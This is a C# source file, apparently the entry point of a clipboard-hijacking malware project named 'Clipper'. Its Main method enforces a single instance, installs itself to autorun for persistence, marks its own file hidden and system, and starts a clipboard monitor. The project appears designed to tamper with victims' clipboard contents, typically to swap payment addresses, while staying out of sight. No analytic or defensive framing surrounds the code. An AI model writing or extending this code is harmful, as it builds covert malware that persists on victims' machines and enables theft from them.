﻿using System;
using Clipper.Modules;

namespace Clipper
{
	internal class Program
	{
		[STAThread]
		private static void Main()
		{
			AppMutex.Check();
			if (!Autorun.is_installed())
			{
				Autorun.install();
			}
			Attributes.set_hidden();
			Attributes.set_system();
			ClipboardMonitor.run();
		}
	}
}
